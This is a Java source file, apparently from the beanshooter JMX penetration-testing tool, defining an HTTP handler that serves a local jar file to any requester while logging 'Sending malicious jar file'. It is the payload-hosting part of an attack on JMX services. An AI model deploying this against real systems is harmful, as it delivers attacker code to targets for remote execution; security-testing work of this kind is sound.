package de.qtc.beanshooter.utils;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

import de.qtc.beanshooter.io.Logger;


public class JarHandler implements HttpHandler {

    String jarName = null;
    String jarPath = null;

    public JarHandler(String jarName, String jarPath)
    {
        this.jarName = jarName;
        this.jarPath = jarPath;
    }

    private byte[] readJar(String jarPath, String jarName) throws IOException
    {
        Path jarPath_ = Paths.get(jarPath + "/" + jarName);
        byte[] bytearray = Files.readAllBytes(jarPath_);
        return bytearray;
    }

    public void handle(HttpExchange t) throws IOException
    {
        String requestURL = t.getRequestURI().toString();
        Logger.print("Received request for ");
        Logger.eprintlnPlain_ye(requestURL);

        byte[] jarContent = this.readJar(this.jarPath, this.jarName);
        Logger.print("Sending malicious jar file... ");

        t.sendResponseHeaders(200, jarContent.length);
        OutputStream os = t.getResponseBody();
        os.write(jarContent,0,jarContent.length);
        os.close();

        Logger.printlnPlain("done!");
        Logger.println("");
    }
}
